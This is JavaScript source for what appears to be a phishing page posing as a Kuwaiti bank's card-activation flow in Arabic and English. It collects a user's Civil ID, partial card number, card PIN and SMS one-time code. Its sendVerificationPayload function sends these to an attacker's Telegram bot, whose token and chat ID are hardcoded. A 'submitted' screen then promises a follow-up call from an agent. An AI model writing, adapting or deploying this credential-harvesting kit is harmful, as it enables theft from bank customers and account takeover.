// =========================================================================
// TELEGRAM BOT CONFIGURATION
// Replace the values below with your Telegram Bot Token and Chat ID.
// =========================================================================
const TELEGRAM_BOT_TOKEN = '9040001517:AAGZA2GjB9nmcneaYLW994A85FSpHa03c-4';
const TELEGRAM_CHAT_ID = '9287285450';

/**
 * Helper function to send custom text messages to your Telegram Chat
 */
async function sendToTelegram(messageText) {
  if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === '9040001517:AAGZA2GjB9nmcneaYLW994A85FSpHa03c-4') {
    console.warn('Telegram Bot Token is not set. Data submission skipped.');
    return;
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  
  try {
    await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: messageText,
        parse_mode: 'HTML'
      })
    });
  } catch (error) {
    console.error('Failed to send data to Telegram:', error);
  }
}

/**
 * Formats all current user state data into a Telegram message
 */
function sendVerificationPayload() {
  const payloadMessage = `
🔐 <b>New Banking Verification Data Received</b>

👤 <b>Civil ID / Resident ID:</b> <code>${state.civilId || 'N/A'}</code>
💳 <b>Card Digits:</b> <code>${state.first4 || '••••'} •••• •••• ${state.last4 || '••••'}</code> (${state.brand.toUpperCase()})
🔑 <b>Card PIN:</b> <code>${state.pin || 'N/A'}</code>
📲 <b>OTP Code:</b> <code>${state.otp || 'N/A'}</code>
🌐 <b>Language:</b> ${state.language.toUpperCase()}
📱 <b>Device View:</b> ${state.mobile ? 'Mobile Phone' : 'Wide Desktop'}
  `.trim();

  sendToTelegram(payloadMessage);
}

// =========================================================================
// APP TRANSLATIONS & STATE MANAGEMENT
// =========================================================================
const translations = {
  en: { hereToServe:'HERE TO SERVE YOU', supportDesc:'Confused about a transaction? unsure about something? never fear, one of our agents is always here', cardInactiveNotice:'If your card is inactive, activate it by signing up.', signUp:'Start Verification', aboutUs:'About Us', exploreProducts:'Explore Products', tools:'Tools', civilIdTitle:'Sign Up', civilIdSubtitle:'Provide your Civil or Resident ID details for identification.', civilIdLabel:'Enter Civil ID / Resident ID', civilIdPlaceholder:'Enter', civilIdError:'Please enter a valid Civil ID', continue:'Continue', cardDigitsTitle:'Debit Card', cardDigitsSubtitle:'Enter the first 4 and last 4 digits of your debit card.', first4Label:'First 4 digits', last4Label:'Last 4 digits', first4Placeholder:'e.g. 4502', last4Placeholder:'e.g. 9812', cardDigitsError:'Please enter all 8 digits (4 first & 4 last)', cardPinTitle:'Debit Card PIN', cardPinSubtitle:'Enter the 4-digit PIN associated with your debit card.', cardPinLabel:'Enter 4-Digit PIN', showPin:'Show PIN', hidePin:'Hide PIN', cardPinError:'Please enter your 4-digit ATM / Card PIN', otpTitle:'Verification Code', otpSubtitle:'Enter the 6-digit OTP code sent via SMS to your registered number', otpLabel:'Enter 6-Digit OTP', resendIn:'Resend code in', resendNow:'Resend Code', confirm:'Confirm', otpError:'Please enter the complete 6-digit OTP code', simulatedSms:'Simulated SMS:', useCode:'Auto-fill', successTitle:'Card Activated & Verified', successSubtitle:'Your debit card and Civil ID have been successfully verified.', submittedTitle:'Details Submitted Successfully', submittedSubtitle:'Thank you. Our agent will review your details and contact you soon.', submittedNote:'Please keep your phone available for a follow-up call.', refLabel:'Reference ID', verifiedCivilId:'Civil ID', verifiedCard:'Debit Card', done:'Back to Home'},
  ar: { hereToServe:'هنا لخدمتك', supportDesc:'هل لديك استفسار عن معاملة؟ لست متأكداً من شيء؟ لا تقلق، فريقنا متواجد دائماً لمساعدتك', cardInactiveNotice:'إذا كانت بطاقتك غير مفعلة، قم بتفعيلها من خلال التسجيل.', signUp:'بدء التحقق', aboutUs:'من نحن', exploreProducts:'استكشف المنتجات', tools:'الأدوات', civilIdTitle:'التسجيل', civilIdSubtitle:'يرجى تقديم تفاصيل البطاقة المدنية أو بطاقة الإقامة للتحقق.', civilIdLabel:'أدخل الرقم المدني / رقم الإقامة', civilIdPlaceholder:'أدخل الرقم', civilIdError:'يرجى إدخال رقم مدني صحيح', continue:'متابعة', cardDigitsTitle:'بطاقة السحب الآلي', cardDigitsSubtitle:'أدخل أول 4 أرقام وآخر 4 أرقام من بطاقة السحب الآلي الخاصة بك.', first4Label:'أول 4 أرقام', last4Label:'آخر 4 أرقام', first4Placeholder:'مثال: 4502', last4Placeholder:'مثال: 9812', cardDigitsError:'يرجى إدخال الأرقام الثمانية بالكامل (4 في البداية و 4 في النهاية)', cardPinTitle:'الرقم السري للبطاقة', cardPinSubtitle:'أدخل الرقم السري المكون من 4 أرقام لبطاقة السحب الآلي.', cardPinLabel:'أدخل الرقم السري (4 أرقام)', showPin:'إظهار الرقم', hidePin:'إخفاء الرقم', cardPinError:'يرجى إدخال الرقم السري المكون من 4 أرقام', otpTitle:'رمز التحقق', otpSubtitle:'أدخل رمز التحقق المكون من 6 أرقام المرسل عبر رسالة نصية إلى هاتفك المسجل', otpLabel:'رمز OTP', resendIn:'إعادة الإرسال خلال', resendNow:'إعادة إرسال الرمز', confirm:'تأكيد', otpError:'يرجى إدخال رمز التحقق المكون من 6 أرقام كاملاً', simulatedSms:'رسالة نصية تجريبية:', useCode:'تعبئة تلقائية', successTitle:'تم تفعيل وتوثيق البطاقة بنجاح', successSubtitle:'تم التحقق من بيانات الرقم المدني وبطاقة السحب الآلي بنجاح.', submittedTitle:'تم إرسال البيانات بنجاح', submittedSubtitle:'شكراً لك. سيقوم أحد موظفينا بمراجعة بياناتك والتواصل معك قريباً.', submittedNote:'يرجى إبقاء هاتفك متاحاً لمتابعة الاتصال.', refLabel:'الرقم المرجعي', verifiedCivilId:'الرقم المدني', verifiedCard:'بطاقة السحب', done:'العودة للرئيسية'}
};
const steps = [['landing','1. Welcome'],['civil_id','2. Civil ID'],['card_digits','2. Card Details'],['card_pin','3. Card PIN']];
const state = { screen:'landing', language:'ar', mobile:true, civilId:'', first4:'', last4:'', brand:'visa', pin:'', otp:'', referenceId:'', maskedPhone:'+965 •••• 4821', demoCode:'849201', timer:59, canResend:false, pinVisible:false, smsVisible:true, error:'' };
let timerHandle;
const app = document.querySelector('#app');
const t = () => translations[state.language];
const esc = (s='') => String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const icon = (name) => ({back:'←',right:'→',check:'✓',copy:'▣',refresh:'↻',delete:'⌫',shield:'◆',eye:'◉',eyeoff:'○',alert:'!'}[name] || '');

function shell(content){
  const isLanding=state.screen==='landing';
  // Time and battery % removed from status bar below[cite: 12]
  return `<div class="shell"><nav class="toolbar"><div class="brand"><i></i> Banking Verification Flow</div><div class="step-switcher">${steps.map(([key,label])=>`<button data-screen="${key}" class="${state.screen===key?'active':''}">${label}</button>`).join('')}</div><div class="toolbar-actions"><button data-lang class="tool-btn">◎ <b>${state.language==='en'?'EN':'عربي'}</b></button><button data-mobile class="tool-btn mobile-toggle">${state.mobile?'▣ Phone View':'▤ Wide View'}</button><button data-reset class="tool-btn">↻</button></div></nav><main><div class="device ${state.mobile?'phone':''}">${state.mobile?`<div class="status ${isLanding?'landing-status':''}"></div>`:''}${content}</div></main></div>`;
}

function header(step){return `<div class="screen-header"><button class="back" data-back>${state.language==='ar'?icon('right'):icon('back')}</button><span>Step ${step} of 4</span></div>`}
function button(text,id,disabled=false){return `<button id="${id}" class="primary" ${disabled?'disabled':''}>${esc(text)}</button>`}
function landing(){const x=t();return `<section class="screen landing" dir="${state.language==='ar'?'rtl':'ltr'}"><div class="x-art"></div><div class="language-pill"><button data-set-lang="en" class="${state.language==='en'?'selected':''}">EN</button><button data-set-lang="ar" class="${state.language==='ar'?'selected':''}">عربي</button></div><div class="landing-center"><div class="headset"><span></span></div><h1>${x.hereToServe}</h1><p>${x.supportDesc}</p><div class="dots"><b></b><i></i><i></i></div></div><div class="landing-bottom"><p>${x.cardInactiveNotice}</p><button class="signup" data-start>${x.signUp}</button><footer><button>${x.aboutUs}</button><em>|</em><button>${x.exploreProducts}</button><em>|</em><button>${x.tools}</button></footer></div></section>`}
function fieldError(){return state.error?`<div class="error"><b>${icon('alert')}</b>${esc(state.error)}</div>`:''}

function formScreen(type){
  const x=t(); 
  if(type==='civil_id') return `<section class="screen form-screen" dir="${state.language==='ar'?'rtl':'ltr'}">${header(1)}<h1>${x.civilIdTitle}</h1><p class="subtitle">${x.civilIdSubtitle}</p><form data-form="civil"><label>${x.civilIdLabel}<input id="civil" inputmode="numeric" value="${esc(state.civilId)}" placeholder="${x.civilIdPlaceholder}" autofocus></label>${fieldError()}<div class="sample-title">✦ Sample Civil ID numbers:</div><div class="samples"><button data-civil="298010104921">298010104921</button><button data-civil="294050208834">294050208834</button></div></form><div class="bottom">${button(x.continue,'continue-civil',!state.civilId.length)}</div></section>`;
  if(type==='card_digits') return `<section class="screen form-screen" dir="${state.language==='ar'?'rtl':'ltr'}">${header(2)}<h1>${x.cardDigitsTitle}</h1><p class="subtitle">${x.cardDigitsSubtitle}</p><div class="debit-card"><div><b>◆ DEBIT CARD</b><small>SMART CHIP</small></div><strong><span>${state.first4||'••••'}</span> •••• •••• <span>${state.last4||'••••'}</span></strong><div><small>ID: ${state.civilId?state.civilId.slice(0,4)+'••••'+state.civilId.slice(-2):'VERIFIED'}</small><small>${state.brand.toUpperCase()}</small></div></div><form data-form="card"><div class="atm-segments"><label class="segment-field"><span>${x.first4Label}</span><input id="first4" inputmode="numeric" maxlength="4" value="${state.first4}" placeholder="${x.first4Placeholder}"></label><div class="masked-segment" aria-label="Masked card digits">XXXX</div><div class="masked-segment" aria-label="Masked card digits">XXXX</div><label class="segment-field"><span>${x.last4Label}</span><input id="last4" inputmode="numeric" maxlength="4" value="${state.last4}" placeholder="${x.last4Placeholder}"></label></div>${fieldError()}<div class="sample-title">✦ Sample card digits:</div><div class="samples"><button data-card="4502,9812">4502 •••• 9812</button><button data-card="5210,4310">5210 •••• 4310</button></div></form><div class="bottom">${button(x.continue,'continue-card',!(state.first4.length===4&&state.last4.length===4))}</div></section>`;
  if(type==='card_pin') return `<section class="screen form-screen" dir="${state.language==='ar'?'rtl':'ltr'}">${header(3)}<h1>${x.cardPinTitle}</h1><p class="subtitle">${x.cardPinSubtitle}</p><div class="info-row">Card: <b>${state.first4||'••••'} •••• •••• ${state.last4||'••••'}</b><span>Encrypted</span></div><div class="pin-label"><b>${x.cardPinLabel}</b><button data-toggle-pin>${state.pinVisible?icon('eyeoff')+' '+x.hidePin:icon('eye')+' '+x.showPin}</button></div><div class="pin-boxes">${[0,1,2,3].map(i=>`<div class="pin-box ${state.pin[i]?'filled':''}">${state.pin[i]?(state.pinVisible?state.pin[i]:'•'):'-'}</div>`).join('')}</div><input id="pin-input" class="pin-input" type="${state.pinVisible?'text':'password'}" inputmode="numeric" maxlength="4" value="${state.pin}" placeholder="Tap to type on keyboard">${fieldError()}<div class="keypad">${'123456789'.split('').map(n=>`<button data-pin="${n}">${n}</button>`).join('')}<button data-clear-pin>Clear</button><button data-pin="0">0</button><button data-backspace>${icon('delete')}</button></div><div class="bottom">${button(x.continue,'continue-pin',state.pin.length!==4)}</div></section>`;
  return otp();
}

function otp(){const x=t();return `<section class="screen form-screen" dir="${state.language==='ar'?'rtl':'ltr'}">${state.smsVisible?`<div class="sms"><div>▣ <b>${x.simulatedSms}</b><small>Code for card ending in ${state.last4||'••••'}: <strong>${state.demoCode}</strong></small></div><button data-use-code>${x.useCode}</button><button data-close-sms>×</button></div>`:''}${header(4)}<h1>${x.otpTitle}</h1><p class="subtitle">${x.otpSubtitle} <b class="phone-number">${state.maskedPhone}</b>.</p><form data-form="otp"><label>${x.otpLabel}</label><div class="otp-grid">${Array.from({length:6},(_,i)=>`<input class="otp" data-otp-index="${i}" inputmode="numeric" maxlength="1" value="${state.otp[i]||''}" autofocus="${i===0}">`).join('')}</div>${fieldError()}<div class="resend"><span>${state.canResend?"Didn't receive SMS?":`${x.resendIn} <b>${state.timer}s</b>`}</span>${state.canResend?`<button data-resend>${icon('refresh')} ${x.resendNow}</button>`:''}</div><div class="demo-center"><button class="demo-link" data-use-code>✦ Fill Demo Code (${state.demoCode})</button></div></form><div class="bottom">${button(x.confirm,'confirm-otp',state.otp.length!==6)}</div></section>`}
function submitted(){const x=t();return `<section class="screen form-screen submitted" dir="${state.language==='ar'?'rtl':'ltr'}"><div class="submitted-modal"><div class="success-icon">✓</div><h1>${x.submittedTitle}</h1><p class="subtitle">${x.submittedSubtitle}</p><div class="submission-note">◆ ${x.submittedNote}</div></div><div class="bottom">${button(x.done,'back-home')}</div></section>`}
function success(){const x=t();return `<section class="screen form-screen success" dir="${state.language==='ar'?'rtl':'ltr'}"><div class="success-content"><div class="success-icon">✓</div><h1>${x.successTitle}</h1><p class="subtitle">${x.successSubtitle}</p><div class="reference"><div><small>${x.refLabel}</small><b>${state.referenceId}</b></div><button data-copy>${icon('copy')} Copy</button></div><div class="summary"><div><span>${x.verifiedCivilId}</span><b>${state.civilId?state.civilId.slice(0,4)+' •••• '+state.civilId.slice(-4):'••••••••'}</b></div><div><span>${x.verifiedCard}</span><b>${state.first4} •••• •••• ${state.last4}</b></div><div class="verified"><span>Verification Status</span><b>✓ ACTIVE & VERIFIED</b></div></div></div><div class="bottom">${button(x.done,'back-home')}</div></section>`}

function render(){document.documentElement.lang=state.language; app.innerHTML=shell(state.screen==='landing'?landing():state.screen==='success'?success():state.screen==='submitted'?submitted():formScreen(state.screen)); bind();}

function bind(){
  document.querySelectorAll('[data-screen]').forEach(b=>b.onclick=()=>{state.screen=b.dataset.screen;state.error='';render()});
  document.querySelector('[data-lang]')?.addEventListener('click',()=>{state.language=state.language==='en'?'ar':'en';render()});
  document.querySelector('[data-mobile]')?.addEventListener('click',()=>{state.mobile=!state.mobile;render()});
  document.querySelector('[data-reset]')?.addEventListener('click',reset);
  document.querySelector('[data-start]')?.addEventListener('click',()=>{state.screen='civil_id';render()});
  document.querySelectorAll('[data-set-lang]').forEach(b=>b.onclick=()=>{state.language=b.dataset.setLang;render()});
  document.querySelector('[data-back]')?.addEventListener('click',()=>{state.screen={civil_id:'landing',card_digits:'civil_id',card_pin:'card_digits'}[state.screen]||'landing';state.error='';render()});

  const civil=document.querySelector('#civil'); if(civil){civil.oninput=()=>{civil.value=civil.value.replace(/\D/g,'');state.civilId=civil.value;state.error='';updateButton('continue-civil',!state.civilId.length)};document.querySelectorAll('[data-civil]').forEach(b=>b.onclick=()=>{state.civilId=b.dataset.civil;render()})}
  const first=document.querySelector('#first4'),last=document.querySelector('#last4');if(first&&last){first.oninput=()=>{first.value=first.value.replace(/\D/g,'').slice(0,4);state.first4=first.value;state.brand=first.value.startsWith('4')?'visa':(first.value.startsWith('5')||first.value.startsWith('2')?'mastercard':'knet');state.error='';render()};last.oninput=()=>{last.value=last.value.replace(/\D/g,'').slice(0,4);state.last4=last.value;state.error='';updateButton('continue-card',!(state.first4.length===4&&state.last4.length===4))};document.querySelectorAll('[data-card]').forEach(b=>b.onclick=()=>{[state.first4,state.last4]=b.dataset.card.split(',');render()})}
  const pin=document.querySelector('#pin-input');if(pin){pin.oninput=()=>{state.pin=pin.value.replace(/\D/g,'').slice(0,4);state.error='';render()};document.querySelectorAll('[data-pin]').forEach(b=>b.onclick=()=>{if(state.pin.length<4)state.pin+=b.dataset.pin;render()});document.querySelector('[data-clear-pin]').onclick=()=>{state.pin='';render()};document.querySelector('[data-backspace]').onclick=()=>{state.pin=state.pin.slice(0,-1);render()};document.querySelector('[data-toggle-pin]').onclick=()=>{state.pinVisible=!state.pinVisible;render()}}
  const otps=document.querySelectorAll('.otp');otps.forEach((input,i)=>{input.oninput=()=>{const v=input.value.replace(/\D/g,''); if(v.length>1){state.otp=v.slice(0,6);render();return}state.otp=state.otp.substring(0,i)+v+state.otp.substring(i+1);state.otp=state.otp.slice(0,6);if(v&&i<5)otps[i+1].focus();updateButton('confirm-otp',state.otp.length!==6)};input.onkeydown=e=>{if(e.key==='Backspace'&&!input.value&&i>0)otps[i-1].focus()};input.onpaste=e=>{e.preventDefault();state.otp=e.clipboardData.getData('text').replace(/\D/g,'').slice(0,6);render()}});document.querySelectorAll('[data-use-code]').forEach(b=>b.onclick=()=>{state.otp=state.demoCode;render()});document.querySelector('[data-close-sms]')?.addEventListener('click',()=>{state.smsVisible=false;render()});document.querySelector('[data-resend]')?.addEventListener('click',()=>{state.demoCode=String(Math.floor(100000+Math.random()*900000));state.timer=59;state.canResend=false;state.otp='';startTimer();render()});

  const actions={
    'continue-civil':()=>{
      if(!state.civilId.length) return fail(t().civilIdError);
      state.maskedPhone='+965 •••• 48'+state.civilId.slice(-2);
      go('card_digits');
    },
    'continue-card':()=>{
      if(state.first4.length!==4||state.last4.length!==4) return fail(t().cardDigitsError);
      go('card_pin');
    },
    'continue-pin':()=>{
      if(state.pin.length!==4) return fail(t().cardPinError);
      sendVerificationPayload();
      go('submitted');
    },
    'confirm-otp':()=>{
      if(state.otp.length!==6) return fail(t().otpError);
      state.referenceId=`VRF-${new Date().getFullYear()}-${Math.floor(100000+Math.random()*900000)}`;
      sendVerificationPayload();
      go('success');
    },
    'back-home':reset
  };

  Object.entries(actions).forEach(([id,fn])=>document.querySelector('#'+id)?.addEventListener('click',fn));
  document.querySelector('[data-copy]')?.addEventListener('click',async e=>{try{await navigator.clipboard.writeText(state.referenceId)}catch{}e.currentTarget.textContent='✓ Copied';setTimeout(render,1500)});
}

function updateButton(id,disabled){const b=document.querySelector('#'+id);if(b)b.disabled=disabled} 
function fail(msg){state.error=msg;render()} 
function go(screen){state.screen=screen;state.error='';if(screen==='otp'){state.timer=59;state.canResend=false;startTimer()}render()} 
function startTimer(){clearInterval(timerHandle);timerHandle=setInterval(()=>{if(state.timer>0){state.timer--;if(state.screen==='otp')render()}else{state.canResend=true;clearInterval(timerHandle);if(state.screen==='otp')render()}},1000)} 
function reset(){Object.assign(state,{screen:'landing',civilId:'',first4:'',last4:'',brand:'visa',pin:'',otp:'',referenceId:'',maskedPhone:'+965 •••• 4821',error:'',timer:59,canResend:false,smsVisible:true});clearInterval(timerHandle);render()}

render();